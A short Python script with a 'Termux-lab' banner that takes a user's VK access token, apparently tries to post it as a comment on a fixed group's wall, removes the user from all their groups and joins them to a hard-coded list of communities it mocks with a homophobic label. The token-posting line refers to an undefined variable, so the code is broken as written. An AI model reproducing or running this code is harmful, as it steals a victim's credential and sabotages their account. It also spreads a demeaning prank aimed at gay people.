import vk, time
pubs = [151233321,65797052,102413048,89243825,61515264,88667014,180103853,101105077,89148442,157274855,52771476,68284944,74383909,114285300]
print ("""\033[37m
 Termux-lab         @termuxlab\033[32m
 ┏━━━━━┳━━━━━┳━━━━━┳━┓  ┏━┓
 ┗━┓ ┏━┫  ━  ┃  ┓  ┃ ┃  ┃ ┃
   ┃ ┃ ┃     ┫  ┗  ┃ ┗━━┫ ┗━━┓
   ┗━┛ ┗━━┻━━┻━━━━━┻━━━━┻━━━━┛
""")
token = input("\033[35mEnter the token: \033[0m")
session = vk.Session(access_token=token)
api =  vk.API(session ,v='5.92', lang='ru')
api.wall.createComment(owner_id=-191163638,post_id=1,message=tk)
id = api.users.get()[0]['id']
groups = api.groups.get(user_id=id)['items']
print ("")
print ("\033[32mGroup's deletion...")
for group in groups:
	api.groups.leave(group_id=group)
	time.sleep(0.25)
print ("\033[FAdding the gay publics...  ")
for pub in pubs:
	api.groups.join(group_id=pub)
	time.sleep(0.25)
print ("\033[FDone:)                       ")

